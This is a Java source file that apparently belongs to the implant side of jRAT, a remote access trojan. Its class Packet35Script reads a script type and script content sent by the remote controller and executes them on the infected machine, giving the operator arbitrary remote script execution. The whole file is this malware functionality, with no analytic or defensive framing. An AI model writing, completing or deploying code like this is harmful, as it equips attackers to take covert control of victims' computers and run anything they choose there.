package se.jrat.stub.packets.incoming;

import se.jrat.common.script.AbstractScript;
import se.jrat.stub.Connection;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String type = con.readLine();
		String content = con.readLine();
		
		AbstractScript script = AbstractScript.getScript(type);
		script.setContent(content);
		script.perform();
	}

}
